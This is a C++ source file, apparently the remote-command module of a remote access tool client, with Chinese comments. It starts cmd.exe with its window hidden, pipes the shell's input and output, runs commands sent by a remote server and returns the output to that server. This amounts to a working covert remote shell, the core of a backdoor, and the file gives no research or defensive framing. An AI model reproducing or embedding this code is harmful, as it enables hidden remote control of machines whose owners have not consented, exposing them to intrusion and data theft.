#include "stdafx.h"
#include "CmdManager.h"


CCMDManager::CCMDManager(CIOCPClient *IOCPClient)
	:CManager(IOCPClient)
{
	_tprintf(_T("CMDManager is under Execution\r\n"));
	// 创建一组管道
	SECURITY_ATTRIBUTES sa;
	ZeroMemory(&sa, sizeof(sa));
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;    // 允许继承
	sa.lpSecurityDescriptor = NULL;


	_M_hCMDReadPipe  = NULL;
	_M_hCMDWritePipe = NULL;
	_M_hClientReadPipe  = NULL;
	_M_hClientWritePipe = NULL;

	if (!CreatePipe(&_M_hClientReadPipe, &_M_hCMDWritePipe, &sa, 0))
	{
		if (_M_hClientReadPipe != NULL)
		{
			CloseHandle(_M_hClientReadPipe);
			_M_hClientReadPipe = NULL;
		}
		if (_M_hCMDWritePipe != NULL)
		{
			CloseHandle(_M_hCMDWritePipe);
			_M_hCMDWritePipe = NULL;
		}
		return;
	}

	if (!CreatePipe(&_M_hCMDReadPipe, &_M_hClientWritePipe, &sa, 0))
	{
		if (_M_hCMDReadPipe != NULL)
		{
			CloseHandle(_M_hCMDReadPipe);
			_M_hCMDReadPipe = NULL;
		}
		if (_M_hClientWritePipe != NULL)
		{
			CloseHandle(_M_hClientWritePipe);
			_M_hClientWritePipe = NULL;
		}
		return;
	}

	TCHAR CMDFullPath[MAX_PATH] = { 0 };
	GetSystemDirectory(CMDFullPath, MAX_PATH);

	_tcscat(CMDFullPath, _T("\\cmd.exe"));

	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(StartupInfo);
	StartupInfo.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput  = _M_hCMDReadPipe;
	StartupInfo.hStdOutput = StartupInfo.hStdError = _M_hCMDWritePipe;

	StartupInfo.wShowWindow = SW_HIDE;

	if (!CreateProcess(
				CMDFullPath,
				NULL,
				NULL,
				NULL,
				TRUE,
				NORMAL_PRIORITY_CLASS,
				NULL,
				NULL,
				&StartupInfo,
				&ProcessInfo
			)
		)
	{
		CloseHandle(_M_hClientReadPipe);
		CloseHandle(_M_hClientWritePipe);
		CloseHandle(_M_hCMDReadPipe);
		CloseHandle(_M_hCMDWritePipe);
		return;
	}
	_M_hCMDProcesss = ProcessInfo.hProcess;
	_M_hCMDThread   = ProcessInfo.hThread;


	BYTE IsToken = CLIENT_CMD_MANAGER_REPLY;

	_M_IOCPClient->OnServerSending((char*)&IsToken, sizeof(BYTE));

	_M_IsLoop = TRUE;

	WaitForServerDialogOpen();

	_M_hThread = CreateThread(
				NULL,
				0,
				(LPTHREAD_START_ROUTINE)_ReadPipeProc,
				(LPVOID)this,
				0,
				NULL
			);
	return;
}

CCMDManager::~CCMDManager()
{
	_tprintf_s(_T("CMDManager() Exit\r\n"));
	_M_IsLoop = FALSE;
	TerminateThread(_M_hCMDThread,0);
	TerminateProcess(_M_hCMDProcesss, 0);

	Sleep(100);

	if (_M_hClientReadPipe != NULL)
	{
		DisconnectNamedPipe(_M_hClientReadPipe);
		CloseHandle(_M_hClientReadPipe);
		_M_hClientReadPipe = NULL;
	}

	if (_M_hClientWritePipe != NULL)
	{
		DisconnectNamedPipe(_M_hClientWritePipe);
		CloseHandle(_M_hClientWritePipe);
		_M_hClientWritePipe = NULL;
	}

	if (_M_hCMDReadPipe != NULL)
	{
		DisconnectNamedPipe(_M_hCMDReadPipe);
		CloseHandle(_M_hCMDReadPipe);
		_M_hCMDReadPipe = NULL;
	}

	if (_M_hCMDWritePipe != NULL)
	{
		DisconnectNamedPipe(_M_hCMDWritePipe);
		CloseHandle(_M_hCMDWritePipe);
		_M_hCMDWritePipe = NULL;
	}


}


void CCMDManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{


	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}

	default:
	{
		// 接受服务端发送过来的数据
		ULONG rLen = 0;
		if (WriteFile(_M_hClientWritePipe,BufferData,BufferLength,&rLen,NULL))
		{
			
		}
		break;
	}
		
	}
	return;
}

DWORD WINAPI CCMDManager::_ReadPipeProc(LPVOID lParam)
{
	ULONG rLen = 0;
	TCHAR v1[0x400] = { 0 };
	DWORD BufferLength = 0;
	CCMDManager* This = (CCMDManager*)lParam;

	while (This->_M_IsLoop)
	{
		Sleep(100);
		while (PeekNamedPipe(This->_M_hClientReadPipe,
			v1,sizeof(v1),&rLen,&BufferLength,NULL))      // 非阻塞函数
		{
			if (rLen <= 0)
				break;
			ZeroMemory(&v1, sizeof(v1));
			LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, BufferLength);

			ReadFile(This->_M_hClientReadPipe, BufferData, BufferLength, &rLen, NULL);
			
			This->_M_IOCPClient->OnServerSending((char*)BufferData, rLen);
		
			LocalFree(BufferData);
		}
	}

	return 0;
}

